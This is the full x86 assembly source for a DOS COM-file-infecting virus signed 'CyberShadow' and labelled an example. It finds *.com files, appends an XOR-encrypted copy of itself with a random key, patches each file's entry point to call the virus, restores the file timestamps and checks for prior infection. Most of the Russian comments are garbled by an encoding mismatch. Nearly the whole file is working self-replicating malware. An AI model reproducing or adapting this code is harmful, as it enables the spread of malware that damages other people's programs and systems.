.model tiny
.code
org 100h
;--------------------------------------
;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;�           뤲Ðβ ㏇�� ��汀� � ��汀� �� 若ギㄽ�． ．昔쩆 댽ゃ恂첓!           �
;�  맓鼇� � �昔ㄾウⓥ� 笹젪��� ㄵギ �▲曄�⑨ 循蝨玎ⓨ碎 ㄵャ ˘席젶Þ짛 � М�  �
;녁ゥㅳ迹Ł 侁�� - 삁뵍럟�뜘� ˘說�! 룼 信循�⒰手� ˘說� Ħ��殊曄� 꿟AMPLE, �젶�
;녕獸 쥯� 췅ㄾ ㏇ⅲ� エ夭 �젳�□졻藺� � 젷．黍燧� 鼇菴�쥯�⑨ (ぎ獸贍� �昔飡��  �
;나젶 貰´恂첓� �α��, �젶 譽� �‘ħβα� ‥� ぎК���졷�ⅱ!                    �
;�                                              CyberShadow...                 �
;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 롟獸昔┃�, 若筍 將� �昔짛 � �� 誓㎤ㄵ�狩좑 �췅 쭬�젲젰� 蓀젳� ㏇� 몠� �昔（
; � 收ゃ耀� ㄸ誓も�黍� (� ��キ臾 �恂呻聲��� ヮ〓� 졻循Æ呻��, 譽� 誠�쳽��
; 召ζ쯄レ��, 若舜 も� 쭬若曄�, ㏇� �젪�� ��誓ㄵ쳽β!)
;--------------------------------------

Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start
Const3 = offset EndVirus - offset Beg_crypt

Begin:  call Start

;--------------------------------------
Start:  cld
        pop DI
        mov BP,3
        sub DI,BP                    ;- DI=100h
        push DI
;      -------------------------------
        mov SI,DS:[100h+1]           ;�
        add SI,103h                  ;� SI=Begin addres
        push SI                      ;�
	mov cx,const3
	mov bx,offset beg_crypt-offset start
	mov al,0
cr_1:
	xor cs:[si+bx],al
	inc bx
	loop cr_1
beg_crypt:
;      -------------------------------
        add SI,Const1                ;�
        push SI                      ;�
        movsw                        ;� �쩺��ⓤ젷� 칛젪Œ彛瑜
        movsb                        ;�    �쩺�瑜 3 줎⒱�.
;      --------------------------------
        mov DX,SI                    ;�
        sub CX,CX                    ;� 췅獄� �쩺¡� º� �젵쳽.
        mov AH,4eh                   ;�
        int 21h                      ;�
        pop SI DI                    ;�
;--------------------------------------
Next:
        cmp word ptr ds:[9ah],61000  ;� ㄻÞ� ‘レ蜈 61000 줎⒱
        jna no_exit                  ;� 쩆-�猶젷Ð젰п�
yes_exit:
	jmp exit
no_exit:
        mov DX,80h+1eh               ;�
        mov AX,3d02h                 ;� �洙p維� �젵�.
        int 21h                      ;�
        jc yes_exit                  ;�
        mov BX,AX                    ;�
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� 葉�젰� �쩺�瑜 3 줎⒱�
        mov AH,3fh                   ;�
        int 21h                      ;�
;      --------------------------------
        cmp byte ptr ds:[si],0e8h    ;� �昔´黍п� 췅 쭬�젲���� (E8h-call)
        je close_file                ;� 쩆-�猶젷Ð젰п�
        cmp word ptr ds:[si],'ZM'    ;� � �� EXE-鈺Ø エ � 췅�?
        je close_file                ;� 쩆-�猶젷Ð젰п�
        mov ax,5700h                 ;�
        int 21h                      ;� 貰魚젺Œ� №�э � 쩆栒 �젵쳽
        push dx                      ;�
        push cx                      ;�
        mov AL,2                     ;�
        call Proc1                   ;� �쩺�Д飡Œⓤ�
        sub SI,BP                    ;�  췅 ぎ�ζ �.
        sub AX,BP                    ;�
        mov [SI+1],AX                ;�
	push si di bx
	mov si,di
	mov di,64000
	mov cx,const2
	rep movsb
cr_11:
	in al,40h
	or al,al
	jz cr_11
addr	equ offset cr_1-offset start-1
	mov si,64000
	mov byte ptr cs:[si+addr],al
addr1	equ offset beg_crypt-offset start
	mov bx,addr1
	mov di,64000+addr1
	mov cx,const1
cr_2:
	xor cs:[si+bx],al
	inc bx
	loop cr_2
	mov dx,si
	pop bx di si
;      --------------------------------
        mov CX,Const2                ;�
        mov AH,40h                   ;� 쭬�ⓤ젷� 收ギ ˘說��
        int 21h                      ;�
;      --------------------------------
        mov AL,0                     ;� �쩺�Д飡Œⓤ�
        call Proc1                   ;� 췅 췅�젷� �젵쳽
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� ��飡젪Œ� call 췅 ˘說�
        mov AH,40h                   ;� � 췅�젷� �젵쳽
        int 21h                      ;�
;      --------------------------------
        pop cx                       ;� ¡遜�젺�˘エ №�э � 쩆栒
        pop dx                       ;�
        mov ax,5701h                 ;�
        int 21h                      ;�
        add si,bp
close_file:
        sub si,bp
        mov AH,3eh                   ;� 쭬챥維� �젵�
        int 21h                      ;�
;      --------------------------------
        add SI,BP                    ;�
        mov AH,4fh                   ;�
        int 21h                      ;� 笹ⅳ莘蟯� �젵�
        jc exit                      ;�
	jmp next
;--------------------------------------
exit:
	ret
        db 'Example by CyberShadow...' ; ㄵ與レ�硫 ぎ�ⓣ젵�
;--------------------------------------
Proc1:
        sub DX,DX                    ;- 듽褻�� � �젵�
        sub CX,CX                    ;
        mov AH,42h                   ;
        int 21h                      ;
        ret                          ;
;--------------------------------------
Jump:           call Begin           ;- 將� ▲ㄵ� 쭬�ⓤ젺� � 췅�젷� �昔（
FreeByte:       nop                  ;� � 將� Д飡� ��� ��舒瑜 3 줎⒱� �昔（
                nop                  ;�
                ret                  ;�
Fname           db '*.com',0         ; 쵟稅� �젵쳽
EndVirus:                            ; GAME OVER!
;--------------------------------------
end begin
